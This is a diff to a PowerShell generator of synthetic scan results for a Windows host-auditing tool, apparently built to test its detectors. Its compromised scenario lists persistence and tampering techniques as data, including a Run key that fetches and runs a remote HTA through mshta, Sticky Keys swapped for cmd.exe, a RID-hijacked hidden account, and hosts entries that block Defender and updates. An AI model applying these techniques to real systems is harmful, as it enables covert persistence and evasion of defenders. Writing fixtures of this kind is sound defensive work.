@@ -163,7 +163,7 @@ $s = [ordered]@{
         tool = 'HostBadger'; kind = 'host'; computerName = $name; schemaVersion = 1; collectorVersion = '1.0'; synthetic = $true
         collectedAtUtc = $CollectedAtUtc; collectedBy = 'NT AUTHORITY\SYSTEM'; runningAsSystem = $true; runningAsAdmin = $true; psVersion = '5.1.20348.2849'
         options = [ordered]@{ skipAcl = $false; checkUpdates = $false }
-        sectionsCollected = @('host', 'patches', 'defender', 'bitlocker', 'boot', 'credentialProtection', 'network', 'remoteAccess', 'localAccounts', 'laps', 'uac', 'powershell', 'audit', 'securityPolicy', 'hardening', 'stig', 'software', 'appx', 'services', 'drivers', 'scheduledTasks', 'autoruns', 'writablePaths', 'credentialExposure', 'persistence', 'certificates', 'wifi', 'browserExtensions')
+        sectionsCollected = @('host', 'patches', 'defender', 'bitlocker', 'boot', 'credentialProtection', 'network', 'remoteAccess', 'localAccounts', 'laps', 'uac', 'powershell', 'audit', 'securityPolicy', 'hardening', 'stig', 'software', 'appx', 'services', 'drivers', 'scheduledTasks', 'autoruns', 'writablePaths', 'credentialExposure', 'persistence', 'certificates', 'wifi', 'browserExtensions', 'loadPoints', 'tamper', 'localGroups', 'shares', 'dns', 'surface')
         collectionErrors = @()
     }
     host                 = [ordered]@{
@@ -172,7 +172,7 @@ $s = [ordered]@{
         os = [ordered]@{ caption = 'Microsoft Windows Server 2022 Standard'; version = '10.0.20348'; build = 20348; ubr = 4171; displayVersion = '21H2'; editionId = 'ServerStandard'; productType = 3; architecture = '64-bit'; installDateUtc = '2024-02-01T10:00:00Z'; lastBootUtc = '2026-09-20T03:00:00Z' }
     }
     patches              = [ordered]@{ hotfixes = @([ordered]@{ id = 'KB5065306'; description = 'Security Update'; installedOnUtc = '2026-09-10T00:00:00Z' }); lastUpdateInstalledUtc = '2026-09-10T03:12:00Z'; rebootPending = [ordered]@{ cbs = $false; windowsUpdate = $false } }
-    defender             = [ordered]@{ present = $true; amRunningMode = 'Normal'; amServiceEnabled = $true; antivirusEnabled = $true; realTimeProtectionEnabled = $true; behaviorMonitorEnabled = $true; ioavProtectionEnabled = $true; isTamperProtected = $true; signatureUpdatedUtc = '2026-09-30T22:00:00Z'; exclusionsReadable = $true; exclusionPaths = @(); exclusionExtensions = @(); exclusionProcesses = @(); asrRules = $allAsr; puaProtection = 1; networkProtection = 1; controlledFolderAccess = 1; mapsReporting = 2; disableBlockAtFirstSeen = $false; disableScriptScanning = $false
+    defender             = [ordered]@{ present = $true; amRunningMode = 'Normal'; amServiceEnabled = $true; antivirusEnabled = $true; realTimeProtectionEnabled = $true; behaviorMonitorEnabled = $true; ioavProtectionEnabled = $true; isTamperProtected = $true; signatureUpdatedUtc = '2026-09-30T22:00:00Z'; exclusionsReadable = $true; exclusionPaths = @(); exclusionExtensions = @(); exclusionProcesses = @(); asrExclusions = @(); asrRuleExclusions = @(); asrRules = $allAsr; puaProtection = 1; networkProtection = 1; controlledFolderAccess = 1; mapsReporting = 2; disableBlockAtFirstSeen = $false; disableScriptScanning = $false
         disableArchiveScanning = $false; disableScanningNetworkFiles = $false; threatDefaultActions = [ordered]@{ severe = 0; high = 0; moderate = 0; low = 0 }; threatIdAllowCount = 0; bruteForceProtection = 1; remoteEncryptionProtection = 1 }
     bitlocker            = [ordered]@{ featureInstalled = $true; volumes = @([ordered]@{ mountPoint = 'C:'; volumeType = 'OperatingSystem'; protectionStatus = 'On'; volumeStatus = 'FullyEncrypted'; encryptionMethod = 'XtsAes256'; keyProtectors = @('Tpm', 'RecoveryPassword') }) }
     boot                 = [ordered]@{ secureBootEnabled = $true; firmware = 'UEFI' }
@@ -249,6 +249,18 @@ $s = [ordered]@{
         amsiFeatureBits = 2; uacAdminApprovalType = 2
         bitlockerExposure = [ordered]@{ standbyOnBattery = 0; standbyPluggedIn = 0; machineLockoutThreshold = 10 }
         osExtras = [ordered]@{ svchostMitigation = 1; lmhosts = 0; smartNameResolutionOff = 1; lockedUserInfo = 3; kerberosArmor = 1 }
+        # CredSSP patched peers only, delegation to named servers, no WinRM wildcard, shadowing with consent,
+        # no Remote Assistance, no DSRM logon, no sudo, no developer mode, Recall feature not installed.
+        credsspDelegation = [ordered]@{ encryptionOracle = 0
+            AllowDefaultCredentials = [ordered]@{ on = $null; servers = @() }; AllowDefCredentialsWhenNTLMOnly = [ordered]@{ on = $null; servers = @() }
+            AllowSavedCredentials = [ordered]@{ on = $null; servers = @() }; AllowSavedCredentialsWhenNTLMOnly = [ordered]@{ on = $null; servers = @() }
+            AllowFreshCredentials = [ordered]@{ on = 1; servers = @('TERMSRV/rds01.corp.example') }; AllowFreshCredentialsWhenNTLMOnly = [ordered]@{ on = $null; servers = @() } }
+        winrmClient = [ordered]@{ trustedHosts = ''; policyTrustedHosts = $null; policyTrustedHostsList = '' }
+        remoteSessionControl = [ordered]@{ shadowPolicy = 1; shadowLocal = 1; offerPolicy = 0; offerFullControl = $null; solicitedPolicy = 0; solicitedLocal = 0 }
+        dsrmAdminLogonBehavior = $null
+        sudo = [ordered]@{ enabled = $null; policy = $null }
+        developerMode = [ordered]@{ allowDevelopment = 0; policyAllowDevelopment = $null }
+        recall = [ordered]@{ feature = 2; disableAiDataAnalysis = $null; allowRecallEnablement = $null }
     }
     # The baseline is a Windows Server 2022 member server; the scenarios set their own product.
     stig                 = Get-StigSection $stigMachine $stigUser ([ordered]@{ edge = $true; chrome = $true; firefox = $true; office = $true }) 'srv2022ms'
@@ -288,6 +300,53 @@ $s = [ordered]@{
     browserExtensions    = [ordered]@{ profiles = @([ordered]@{ user = 'jsmith'; browser = 'Edge'; profile = 'Default'; extensions = @(
                     [ordered]@{ id = 'bbbbccccddddeeeeffffgggghhhhiiii'; name = 'Docs Viewer'; version = '2.1.0'; enabled = $true; source = 'store'; permissions = @('storage', 'https://docs.example.com/*'); contentScripts = @() },
                     [ordered]@{ id = 'ccccddddeeeeffffgggghhhhiiiijjjj'; name = 'Corp SSO'; version = '5.0.1'; enabled = $true; source = 'policy'; permissions = @('<all_urls>', 'cookies', 'webRequest'); contentScripts = @() }) }) }
+    # Windows' own load points, signed by Microsoft; nothing hidden; the logon screen tools are the originals.
+    loadPoints           = [ordered]@{
+        networkProviders = @([ordered]@{ name = 'RDPNP'; dll = 'C:\Windows\System32\drprov.dll'; exists = $true; signer = 'Microsoft Windows'; status = 'Valid' }, [ordered]@{ name = 'LanmanWorkstation'; dll = 'C:\Windows\System32\ntlanman.dll'; exists = $true; signer = 'Microsoft Windows'; status = 'Valid' })
+        credentialProviders = @([ordered]@{ kind = 'provider'; clsid = '{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}'; name = 'PasswordProvider'; dll = 'C:\Windows\system32\credprovs.dll'; exists = $true; signer = 'Microsoft Windows'; status = 'Valid' })
+        appCertDlls = @(); sessionManagerExecute = @([ordered]@{ value = 'BootExecute'; command = 'autocheck autochk *' })
+        timeProviders = @([ordered]@{ name = 'NtpClient'; dll = 'C:\Windows\system32\w32time.dll'; enabled = 1; exists = $true; signer = 'Microsoft Windows'; status = 'Valid' })
+        printProcessors = @([ordered]@{ environment = 'Windows x64'; name = 'winprint'; driver = 'winprint.dll'; exists = $true; signer = 'Microsoft Windows'; status = 'Valid' })
+        dotnetProfiler = $null; aeDebug = @(); serviceHooks = @(); hiddenServices = @(); hiddenTasks = @(); logonScripts = @(); psProfiles = @()
+        officeTestMachine = @(); officeProfiles = @(); userHivesRead = 1
+        ssh = [ordered]@{ installed = $false; adminKeys = $null; userKeys = @() }; bitsJobs = @(); bitsJobCount = 2
+        accessibility = @(foreach ($tool in @(@('sethc.exe', 'sethc.exe'), @('utilman.exe', 'utilman2.exe'), @('osk.exe', 'osk.exe'), @('narrator.exe', 'SR.exe'), @('magnify.exe', 'ScreenMagnifier.exe'), @('displayswitch.exe', 'DisplaySwitch'), @('atbroker.exe', 'ATBroker.exe'))) {
+                [ordered]@{ name = $tool[0]; originalName = "$($tool[1]).mui"; internalName = $tool[1]; signer = 'Microsoft Windows'; status = 'Valid' } })
+        missingTargets = @()
+    }
+    # Event logging intact, a clean boot, the stock hosts file, no proxy, a publisher pushed by Group Policy.
+    tamper               = [ordered]@{
+        miniNt = $false; eventLogStart = 2
+        autologgers = @([ordered]@{ name = 'EventLog-Security'; start = 1 }, [ordered]@{ name = 'EventLog-System'; start = 1 }, [ordered]@{ name = 'EventLog-Application'; start = 1 })
+        securityAuditingProvider = 1; systemStartOptions = 'NOEXECUTE=OPTIN'
+        hosts = [ordered]@{ read = $true; total = 0; entries = @() }; winHttpProxy = $null
+        trustedPublishers = @([ordered]@{ thumbprint = '1A2B3C4D5E6F708192A3B4C5D6E7F8091A2B3C4D'; store = 'gpo'; subject = 'CN=Corp Code Signing, O=Corp'; notAfterUtc = '2028-01-01T00:00:00Z' })
+    }
+    # The privileged built-in groups empty, Remote Desktop Users holding one named group; the SAM consistent.
+    localGroups          = [ordered]@{
+        groups = @([ordered]@{ sid = 'S-1-5-32-551'; name = 'Backup Operators'; members = @() }, [ordered]@{ sid = 'S-1-5-32-555'; name = 'Remote Desktop Users'; members = @([ordered]@{ path = 'CORP/Helpdesk'; sid = "$domainSid-1120"; class = 'Group' }) })
+        samRead = $true; rids = @([ordered]@{ keyRid = 500; fRid = 500 }, [ordered]@{ keyRid = 501; fRid = 501 })
+    }
+    # One share, everyone may read it only.
+    # The domain's own resolvers, and a public one reached over DNS over HTTPS.
+    dns                  = [ordered]@{ dohPolicy = 2; autoDoh = $null; wellKnown = @('1.1.1.1', '8.8.8.8')
+        adapters = @([ordered]@{ name = 'Intel(R) Ethernet Connection I219-LM'; dhcp = $true; servers = @('10.0.0.10', '10.0.0.11', 'fec0:0:0:ffff::1'); doh = @() },
+            [ordered]@{ name = 'Corp VPN Adapter'; dhcp = $false; servers = @('9.9.9.9'); doh = @([ordered]@{ server = '9.9.9.9'; flags = 2; template = $true }) }) }
+    shares               = @([ordered]@{ name = 'Docs'; path = 'D:\Docs'; defaultPermissions = $false; access = @([ordered]@{ sid = 'S-1-1-0'; mask = 1179817 }); ntfsWriters = @() })
+    # One real printer, WSL off, a signed Office add-in, a TPM behind the Hello PIN, an inbound rule
+    # for an installed program; named pipes not read (-NamedPipes not given).
+    surface              = [ordered]@{
+        printers = [ordered]@{ local = 1; shared = 0 }
+        features = [ordered]@{ 'Microsoft-Windows-Subsystem-Linux' = 2; 'VirtualMachinePlatform' = 2 }
+        wslDistributions = @(); userHivesRead = 1
+        officeAddins = @([ordered]@{ app = 'Outlook'; progId = 'UCAddin.LyncAddin.1'; scope = 'machine'; loadBehavior = 3; kind = 'com'; manifest = ''; dll = [ordered]@{ path = 'C:\Program Files\Microsoft Office\root\Office16\UCADDIN.DLL'; exists = $true; signer = 'Microsoft Corporation'; status = 'Valid' } })
+        credentialFiles = @()
+        systemRestore = [ordered]@{ disableSR = $null; disableConfig = $null }
+        tpm = [ordered]@{ present = $true; enabled = $true; activated = $true }
+        helloPinUsers = 1; helloForBusiness = $null
+        firewallUserApps = @()
+        namedPipes = $null
+    }
 }
 
 # ------------------------------------------------------------------ scenarios
@@ -530,6 +589,80 @@ switch ($Scenario) {
         $s.persistence.printMonitors = @($s.persistence.printMonitors) + @([ordered]@{ name = 'Contoso Print Monitor'; driver = 'ctxpmon.dll'; exists = $true; signer = 'Contoso Ltd.'; status = 'Valid' })
         $s.certificates.roots = @($s.certificates.roots) + @([ordered]@{ thumbprint = '0F1E2D3C4B5A69788796A5B4C3D2E1F00F1E2D3C'; store = 'machine'; subject = 'CN=Fabrikam Inspection CA, O=Fabrikam Web Filter'; notAfterUtc = '2035-01-01T00:00:00Z'; selfSigned = $true; hasPrivateKey = $true; inMicrosoftProgram = $false })
         $s.wifi = @($s.wifi) + @([ordered]@{ name = 'CafeGuest-5G'; authentication = 'open'; encryption = 'none'; connectionMode = 'auto'; nonBroadcast = $false })
+        # Load points few tools read: a password-capturing network provider, an unsigned AppCertDll, a boot
+        # program, an unsigned time provider, a vendor print processor, a .NET profiler, a crash debugger.
+        $lp = $s.loadPoints
+        $lp.networkProviders = @($lp.networkProviders) + @([ordered]@{ name = 'LogonNotify'; dll = 'C:\Windows\System32\lognp.dll'; exists = $true; signer = $null; status = 'NotSigned' })
+        $lp.credentialProviders = @($lp.credentialProviders) + @([ordered]@{ kind = 'filter'; clsid = '{0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0}'; name = 'Contoso SSO Filter'; dll = 'C:\Program Files\Contoso SSO\cpfilter.dll'; exists = $true; signer = 'Contoso Ltd.'; status = 'Valid' })
+        $lp.appCertDlls = @([ordered]@{ name = 'certhelp'; dll = 'C:\ProgramData\certhelp.dll'; exists = $true; signer = $null; status = 'NotSigned' })
+        $lp.sessionManagerExecute = @($lp.sessionManagerExecute) + @([ordered]@{ value = 'BootExecute'; command = 'bootsvc.exe /q' })
+        $lp.timeProviders = @($lp.timeProviders) + @([ordered]@{ name = 'NtpExtra'; dll = 'C:\Windows\Temp\ntpx.dll'; enabled = 1; exists = $true; signer = $null; status = 'NotSigned' })
+        $lp.printProcessors = @($lp.printProcessors) + @([ordered]@{ environment = 'Windows x64'; name = 'ContosoPrint'; driver = 'ctxprint.dll'; exists = $true; signer = 'Contoso Ltd.'; status = 'Valid' })
+        $lp.dotnetProfiler = [ordered]@{ values = [ordered]@{ COR_ENABLE_PROFILING = '1'; COR_PROFILER = '{11111111-2222-3333-4444-555555555555}'; COR_PROFILER_PATH_64 = 'C:\Users\Public\prof64.dll' }; dll = 'C:\Users\Public\prof64.dll'; exists = $true; signer = $null; status = 'NotSigned' }
+        $lp.aeDebug = @([ordered]@{ wow64 = $false; debugger = '"C:\ProgramData\dbg\crashmon.exe" -p %ld -e %ld'; auto = 1; exists = $true; signer = $null; status = 'NotSigned' })
+        # A service whose ServiceDll lives in ProgramData, one hidden by a deny entry, a hidden task.
+        $lp.serviceHooks = @([ordered]@{ name = 'WinHelperSvc'; start = 2; serviceDll = 'C:\ProgramData\WinHelper\helper.dll'; exists = $true; signer = $null; status = 'NotSigned'; failureCommand = 'C:\ProgramData\WinHelper\restart.cmd' })
+        $lp.hiddenServices = @([ordered]@{ name = 'SysCacheSvc'; imagePath = 'C:\Windows\Temp\syscache.exe'; deniedTo = @('S-1-5-4', 'S-1-5-32-545', 'S-1-5-32-544'); notListed = $true })
+        $lp.hiddenTasks = @([ordered]@{ path = '\Microsoft\Windows\UpdateOrchestrator\CacheRefresh'; noSecurityDescriptor = $true; indexZero = $false; xmlExists = $true })
+        # Scripts at logon and startup, an all-users PowerShell profile users can write.
+        $lp.logonScripts = @([ordered]@{ scope = 'Machine'; event = 'Startup'; powershell = $true; command = 'C:\Windows\Temp\init.ps1'; parameters = ''; user = '' },
+            [ordered]@{ scope = 'User'; event = 'UserInitMprLogonScript'; powershell = $false; command = 'C:\Users\jsmith\AppData\Roaming\logon.bat'; parameters = ''; user = 'jsmith' })
+        $lp.psProfiles = @([ordered]@{ path = 'C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1'; length = 412; writableBy = @((W 'file' 'S-1-5-32-545')) })
+        # Office: the Office test DLL, an Outlook home page, an XLL add-in, VBA object model trusted.
+        $lp.officeTestMachine = @([ordered]@{ wow64 = $false; dll = 'C:\Users\Public\offtest.dll' })
+        $lp.officeProfiles = @([ordered]@{ user = 'jsmith'; officeTest = ''; homePages = @([ordered]@{ folder = 'Inbox'; url = 'http://203.0.113.10/inbox.html' }); xll = @('C:\Users\jsmith\AppData\Roaming\Microsoft\AddIns\pricing.xll'); accessVbom = @('Word 16.0', 'Excel 16.0') })
+        # OpenSSH server with administrator keys users can write, and a user key.
+        $lp.ssh = [ordered]@{ installed = $true; adminKeys = [ordered]@{ path = 'C:\ProgramData\ssh\administrators_authorized_keys'; keys = 2; writableBy = @((W 'file' 'S-1-5-11')) }; userKeys = @([ordered]@{ user = 'jsmith'; keys = 1 }) }
+        $lp.bitsJobs = @([ordered]@{ name = 'Font cache refresh'; owner = 'CORP\jsmith'; state = 'Transferred'; notifyCmdLine = 'C:\Users\jsmith\AppData\Local\Temp\fc.exe /run'; createdUtc = '2026-09-20T08:00:00Z' })
+        # Sticky Keys replaced by a copy of cmd.exe (still signed by Microsoft).
+        $lp.accessibility = @(foreach ($tool in @($lp.accessibility)) { if ($tool.name -eq 'sethc.exe') { [ordered]@{ name = 'sethc.exe'; originalName = 'Cmd.Exe.MUI'; internalName = 'cmd'; signer = 'Microsoft Windows'; status = 'Valid' } } else { $tool } })
+        # A service of removed software whose program users may create (C:\ lets them create folders).
+        $lp.missingTargets = @([ordered]@{ source = 'service'; name = 'OldAgentSvc'; executable = 'C:\OldAgent\bin\agent.exe'; existingFolder = 'C:\'; missingLevels = 2; creators = @([ordered]@{ sid = 'S-1-5-11'; rights = 'AppendData' }) })
+        # A Run key that fetches and runs a script through mshta.
+        $s.autoruns = @($s.autoruns) + @([ordered]@{ location = 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'; name = 'MediaSync'; command = 'C:\Windows\System32\mshta.exe https://cdn.example.net/sync.hta'; executable = 'C:\Windows\System32\mshta.exe'; writableBy = @() })
+        # Accounts: one carrying the Administrator's RID, named like a computer account; privileged groups used.
+        $s.localAccounts.users = @($s.localAccounts.users) + @([ordered]@{ name = 'helper$'; sid = "$machineSid-1003"; enabled = $true; passwordRequired = $true; passwordExpires = $true; lastLogonUtc = $null; passwordLastSetUtc = '2026-09-01T00:00:00Z' })
+        $s.localGroups.rids = @($s.localGroups.rids) + @([ordered]@{ keyRid = 1003; fRid = 500 })
+        $s.localGroups.groups = @([ordered]@{ sid = 'S-1-5-32-551'; name = 'Backup Operators'; members = @([ordered]@{ path = 'CORP/jsmith'; sid = "$domainSid-1201"; class = 'User' }) },
+            [ordered]@{ sid = 'S-1-5-32-580'; name = 'Remote Management Users'; members = @([ordered]@{ path = 'NT AUTHORITY/Authenticated Users'; sid = 'S-1-5-11'; class = 'Group' }) })
+        # Logging blinded, test signing, update and Defender names blocked, a local proxy, a publisher trusted by hand.
+        $s.tamper.autologgers = @([ordered]@{ name = 'EventLog-Security'; start = 1 }, [ordered]@{ name = 'EventLog-System'; start = 0 }, [ordered]@{ name = 'DefenderApiLogger'; start = 0 })
+        $s.tamper.systemStartOptions = 'NOEXECUTE=OPTIN TESTSIGNING'
+        $s.tamper.hosts = [ordered]@{ read = $true; total = 3; entries = @([ordered]@{ address = '0.0.0.0'; name = 'fe2.update.microsoft.com' }, [ordered]@{ address = '0.0.0.0'; name = 'sls.update.microsoft.com' }, [ordered]@{ address = '127.0.0.1'; name = 'wdcp.microsoft.com' }) }
+        $s.tamper.winHttpProxy = [ordered]@{ flags = 3; proxy = '127.0.0.1:8888'; bypass = '<local>' }
+        $s.tamper.trustedPublishers = @($s.tamper.trustedPublishers) + @([ordered]@{ thumbprint = '9F8E7D6C5B4A39281706F5E4D3C2B1A09F8E7D6C'; store = 'machine'; subject = 'CN=Fabrikam Tools, O=Fabrikam'; notAfterUtc = '2029-05-01T00:00:00Z' })
+        # A share everyone may write.
+        $s.shares = @($s.shares) + @([ordered]@{ name = 'ScanDrop'; path = 'C:\ScanDrop'; defaultPermissions = $false; access = @([ordered]@{ sid = 'S-1-1-0'; mask = 2032127 }); ntfsWriters = @([ordered]@{ sid = 'S-1-1-0'; rights = 'Modify, Synchronize' }) })
+        # Wi-Fi with a public resolver in clear (given by DHCP), next to the internal one.
+        $s.dns.adapters = @($s.dns.adapters) + @([ordered]@{ name = 'Realtek Wi-Fi 6 Adapter'; dhcp = $true; servers = @('8.8.8.8', '192.168.1.1'); doh = @() })
+        $s.dns.dohPolicy = $null        # CredSSP vulnerable, credentials delegated anywhere, WinRM trusting every host, shadowing without
+        # consent, unsolicited Remote Assistance, inline sudo, developer mode, Recall without a policy.
+        $hd = $s.hardening
+        $hd.credsspDelegation.encryptionOracle = 2
+        $hd.credsspDelegation.AllowDefaultCredentials = [ordered]@{ on = 1; servers = @('*') }
+        $hd.winrmClient.trustedHosts = '*'
+        $hd.remoteSessionControl = [ordered]@{ shadowPolicy = 2; shadowLocal = 1; offerPolicy = 1; offerFullControl = 1; solicitedPolicy = $null; solicitedLocal = 1 }
+        $hd.sudo = [ordered]@{ enabled = 3; policy = $null }
+        $hd.developerMode = [ordered]@{ allowDevelopment = 1; policyAllowDevelopment = $null }
+        $hd.recall = [ordered]@{ feature = 1; disableAiDataAnalysis = $null; allowRecallEnablement = $null }
+        # Smaller doors: a WSL distribution and Hyper-V, an unsigned Office add-in in the profile, many
+        # saved credentials, VSS disabled and System Restore off by policy, a Hello PIN without a TPM,
+        # AnyDesk from Downloads let in on the Public profile, an ASR exclusion of Temp and, read with
+        # -NamedPipes, a vendor pipe open to everyone next to Windows' own.
+        $sf = $s.surface
+        $sf.features = [ordered]@{ 'Microsoft-Windows-Subsystem-Linux' = 1; 'VirtualMachinePlatform' = 1; 'Microsoft-Hyper-V-All' = 1 }
+        $sf.wslDistributions = @([ordered]@{ user = 'jsmith'; name = 'Ubuntu-24.04'; version = 2 })
+        $sf.officeAddins = @($sf.officeAddins) + @([ordered]@{ app = 'Excel'; progId = 'PriceSync.Connect'; scope = 'jsmith'; loadBehavior = 3; kind = 'com'; manifest = ''; dll = [ordered]@{ path = 'C:\Users\jsmith\AppData\Roaming\PriceSync\pricesync64.dll'; exists = $true; signer = $null; status = 'NotSigned' } })
+        $sf.credentialFiles = @([ordered]@{ user = 'jsmith'; count = 14 })
+        $sf.systemRestore.disableSR = 1
+        $sf.tpm = [ordered]@{ present = $false; enabled = $false; activated = $false }
+        $sf.firewallUserApps = @([ordered]@{ program = 'C:\Users\jsmith\Downloads\AnyDesk.exe'; store = 'local'; profiles = @('Public'); anyRemote = $true; protocol = 6 }, [ordered]@{ program = 'C:\Users\jsmith\Downloads\AnyDesk.exe'; store = 'local'; profiles = @('Public'); anyRemote = $true; protocol = 17 })
+        $s.meta.options.namedPipes = $true
+        $sf.namedPipes = [ordered]@{ total = 180; read = 41; writable = @([ordered]@{ name = 'lsass'; sids = @('S-1-1-0') }, [ordered]@{ name = 'FabrikamUpdaterPipe'; sids = @('S-1-1-0', 'S-1-5-11') }) }
+        $s.services = @($s.services) + @(Svc 'VSS' 'C:\Windows\system32\vssvc.exe' 'C:\Windows\system32\vssvc.exe' 'LocalSystem' 'Stopped')
+        @($s.services)[-1].startMode = 'Disabled'
+        $s.defender.asrExclusions = @('C:\Users\jsmith\AppData\Local\Temp')
+        $s.defender.asrRuleExclusions = @([ordered]@{ rule = 'd4f940ab-401b-4efc-aadc-ad5f3c50688a'; paths = @('C:\Program Files\Contoso ERP\erp.exe') })
     }
     'dc' {
         $s.host.os.caption = 'Microsoft Windows Server 2019 Standard'
@@ -546,6 +679,8 @@ switch ($Scenario) {
         # A Zerologon exception kept for an old appliance, Server Operators allowed to schedule tasks,
         # and the shutdown button on the logon screen.
         $s.hardening.netlogon.vulnerableChannelAllowListPresent = $true; $s.hardening.netlogon.refusePasswordChange = 1
+        # The DSRM administrator may log on over the network.
+        $s.hardening.dsrmAdminLogonBehavior = 2
         $s.hardening.serverLogon.submitControl = 1; $s.hardening.serverLogon.shutdownWithoutLogon = 1
         # CIS Windows Server settings that Windows 11 does not have, all left at the Windows default.
         $s.hardening.serverSmb = [ordered]@{ minSmb2Dialect = $null; clientRequireEncryption = $null }
